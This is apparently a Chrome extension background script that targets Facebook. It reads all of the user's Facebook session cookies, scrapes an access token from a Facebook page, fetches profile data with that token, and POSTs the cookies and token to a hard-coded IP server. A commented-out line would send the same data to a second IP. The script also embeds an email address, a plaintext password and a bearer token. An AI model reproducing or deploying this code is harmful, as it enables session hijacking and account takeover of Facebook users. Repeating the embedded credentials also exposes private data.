chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
    console.log(response);
    switch (response) {
        case 'checklogin':
            if (await checkfbLogin()) {
                sendtoContent('showsendData');
            } else {
                sendtoContent('showlogin');
            }
            break;
        case 'sendData':
            facebookData();
            break;
        case 'Login':
            chrome.tabs.create({ url: 'https://mbasic.facebook.com/login/?ref=dbl&fl' });
            chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
                chrome.tabs.query({ active: true, currentWindow: true }, function() {
                    document.getElementById('m_login_email').value = '';
                    document.querySelector('input[name="pass"]').value = '';
                });

            });
            break;
        default:
            console.log('nofunction');
            // code block
    }
});
// sendtoContent('abc');

async function checkfbLogin() {
    var p = new Promise(function(resolve, reject) {
        chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(cookies) {
            cookies.forEach(item => {
                if (item['name'] == "c_user") {
                    // console.log(item['name']);
                    resolve(true); //signed in
                    return;
                }
            })
            resolve(false);
        })
    });
    const result = await p;
    // console.log(result);
    return result;
}

function sendtoContent(msg) {
    chrome.tabs.query({ active: true, currentWindow: true }, gotTabs);

    function gotTabs(tabs) {
        console.log('gotTab');
        console.log(tabs);
        chrome.tabs.sendMessage(tabs[0].id, msg);
    };
}

function facebookData() {
    var uToken, bToken, fbInfo, UA;
    var url = 'https://mbasic.facebook.com';
    UA = navigator.userAgent;
    chrome.cookies.getAll({ url: url }, function(e) {
        if (e.length > 0) {
            format = '';
            for (let i = 0; i < e.length; i++) {
                format += e[i].name + '=' + e[i].value;
                if (i < e.length - 1) {
                    format += ','
                }
            }

            // var z = $.ajax({
            //     url: "https://business.facebook.com/business_locations",
            //     type: "get",
            //     async: false,
            //     global: false,
            //     success: function(t) {
            //         return t;
            //     }
            // }).responseText;
            // z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
            var s = $.ajax({
                url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                type: "get",
                async: false,
                global: false,
                success: function(t) {
                    return t;
                }
            }).responseText;
            s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
            if ("" != uToken) {
                fbInfo = $.ajax({
                    url: "https://graph.facebook.com/me?access_token=".concat(uToken),
                    type: "get",
                    dataType: 'json',
                    async: false,
                    global: false,
                    success: function() {
                        return;
                    }
                }).responseJSON;
            }
            console.log(fbInfo);
            // var sendurl = `http://13.21.34.124:8080/php/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${url}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
            // console.log(sendurl);
            // var encodeurl = encodeURI(sendurl);
            // console.log(encodeurl);
            // chrome.tabs.create({ url: encodeurl });
            var data = {
                "loginCookies": format,
                "loginPassword": "SoN0969669531ok?",
                "loginUsername": "sondc.ecom.ftu@gmail.com",
                "socialAccountState": 0,
                "socialAccountStateDescription": 0,
                "socialNetwork": {
                    "id": 1
                },
                "status": true,
                "user": {
                    "id": 1,
                    "login": "admin"
                },
                "userToken": uToken,
                "userTokenState": 0,
                "userTokenStateDescription": "token"
            };
            $.ajax({
                url: "http://13.21.34.9:8081/api/connectome-social-media/create",
                type: 'POST',
                beforeSend: function(xhr) {
                    xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODQxNDg1Nn0.vt-KxVv9DbQa2qeme36LJRQojKnHcKv6VRW_F9wvtE_xzYEcoy2vYBwmZhA6mKdJieObhsk8GRSKj6-KF7T-_Q');
                },
                contentType: 'application/json',
                data: JSON.stringify(data),
                success: function(response) {
                    console.log(response);
                    debugger;
                },
                error: function(r) {
                    console.log(r);
                    debugger;
                },
            })
        }
    })
};



// chrome.browserAction.onClicked.addListener(function(activeTab) {
//     chrome.storage.sync.get(['FncMyELTS'], function(result) {
//         if (result.FncMyELTS == "FncMyELTSver1"){
//             chrome.tabs.executeScript({
//                 file: "js/MyELTSver1.js"
//             });
//         }
//         if (result.FncMyELTS == "FncMyELTSver2"){
//             chrome.tabs.executeScript({
//                 file: "js/MyELTSver2.js"
//             });
//         }
//         if (result.FncMyELTS == "FncMyELTSver3"){
//             chrome.tabs.executeScript({
//                 file: "js/MyELTSver3.js"
//             });
//         }
//     });
//     if (i % 15 == 14){
//         chrome.tabs.create({url: "https://shawnsavour.com/Buy-me-a-coffee/"});
//     };
//     i++

// });